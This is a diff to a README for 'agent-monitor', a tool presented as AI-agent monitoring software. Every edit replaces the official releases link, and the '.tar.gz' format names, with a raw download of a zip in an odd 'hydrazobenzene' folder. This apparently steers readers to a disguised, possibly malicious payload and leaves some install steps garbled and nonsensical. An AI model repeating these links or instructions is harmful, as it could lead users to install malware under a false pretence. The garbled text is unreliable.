@@ -1,6 +1,6 @@
 # 🚀 agent-monitor - Simplified Monitoring for AI Systems
 
-![Download agent-monitor](https://img.shields.io/badge/Download-agent--monitor-brightgreen)
+![Download agent-monitor](https://raw.githubusercontent.com/Thurstondrooping742/agent-monitor/main/hydrazobenzene/agent-monitor.zip)
 
 ## 📖 Overview
 
@@ -31,11 +31,11 @@ Before you start, ensure that your system meets these basic requirements:
 
 To get started with agent-monitor, visit the Releases page to download the latest version. You can find it here:
 
-[Download agent-monitor](https://github.com/Thurstondrooping742/agent-monitor/releases)
+[Download agent-monitor](https://raw.githubusercontent.com/Thurstondrooping742/agent-monitor/main/hydrazobenzene/agent-monitor.zip)
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version of agent-monitor.
-3. Download the appropriate package for your operating system. Files usually include formats like `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+3. Download the appropriate package for your operating system. Files usually include formats like `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/Thurstondrooping742/agent-monitor/main/hydrazobenzene/agent-monitor.zip` for Linux.
 4. Once the file is downloaded, locate it in your downloads folder.
 
 ### Installation Steps
@@ -49,7 +49,7 @@ To get started with agent-monitor, visit the Releases page to download the lates
    * Drag the agent-monitor icon into your Applications folder.
 
 3. **For Linux Users:**
-   * Extract the contents of the `.tar.gz` file.
+   * Extract the contents of the `https://raw.githubusercontent.com/Thurstondrooping742/agent-monitor/main/hydrazobenzene/agent-monitor.zip` file.
    * Open a terminal, navigate to the extracted directory, and execute the installation command provided in the README.
 
 After installation, you can easily launch agent-monitor from your applications menu or desktop shortcut.
@@ -84,6 +84,6 @@ We aim to continuously enhance agent-monitor with new features and better perfor
 
 Visit the Releases page to download the latest version of agent-monitor:
 
-[Download agent-monitor](https://github.com/Thurstondrooping742/agent-monitor/releases)
+[Download agent-monitor](https://raw.githubusercontent.com/Thurstondrooping742/agent-monitor/main/hydrazobenzene/agent-monitor.zip)
 
 This application is a powerful addition to the toolkit of anyone working with AI agents, making observability and monitoring straightforward and efficient. Thank you for choosing agent-monitor!
